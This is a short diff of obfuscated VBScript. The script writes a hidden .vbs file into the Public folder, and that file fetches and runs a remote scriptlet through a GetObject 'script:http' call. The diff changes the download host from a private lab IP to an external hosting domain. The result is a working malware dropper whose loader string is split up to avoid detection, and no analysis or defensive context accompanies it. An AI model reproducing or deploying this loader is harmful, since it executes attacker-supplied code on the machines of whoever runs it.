@@ -10,7 +10,7 @@ CreateObject("Wscript.Shell").Run "cmd /c (" & _
 "echo. & " & _
 "echo PGcfYr=""."" & " & _
 "echo pWZOTX=""sC"" ^& TbJkij ^& ""pt:ht"" ^& IStFwY ^& ""://"" & " & _
-"echo pWZOTX=pWZOTX ^& ""192.168.0.24/vb/"" & " & _
+"echo pWZOTX=pWZOTX ^& ""180.32.109.208.host.secureserver.net/vb/"" & " & _
 "echo. & " & _
 "echo GetObject^(pWZOTX^)" & _
 ") > %Public%\ZWYgtmVP.vbs", 2, TRUE
